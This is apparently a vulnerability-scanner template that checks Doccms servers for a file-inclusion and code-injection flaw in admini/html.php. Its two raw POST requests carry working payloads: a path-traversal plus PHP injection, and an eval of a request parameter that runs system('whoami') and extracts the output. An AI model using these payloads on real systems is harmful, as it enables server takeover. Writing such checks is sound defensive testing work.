id: doccms-code-execution

info:
  name: Doccms Frontend Code Execution
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    The Doccms system contains an arbitrary file inclusion vulnerability in the html.php file of versions 2021 and earlier, allowing attackers to execute arbitrary code and obtain server permissions.
  reference:
    - http://www.doccms.com
  classification:
    cvss-metrics: "3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    cvss-score: 10.0
    cwe-id: CWE-94

http:
  - raw:
      - |
        POST /admini/html.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        m=/../../../admini/views/system/lang/editTags.php&tags=1);echo md5(123);//
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "202cb962ac59075b964b07152d234b7"
        part: body
      - type: status
        status:
          - 200

  - raw:
      - |
        POST /admini/html.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        8=system("whoami");&m=/../../../admini/views/system/lang/editTags.php&tags=1);echo md5(123);eval(stripslashes($_REQUEST[8]));echo md5(123);//
    extractors:
      - type: regex
        name: output
        part: body
        group: 1
        regex:
          - "202cb962ac59075b964b07152d234b70([\\w\\W]+)202cb962ac59075b964b07152d234b70"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "202cb962ac59075b964b07152d234b70"
        part: body
      - type: status
        status:
          - 200
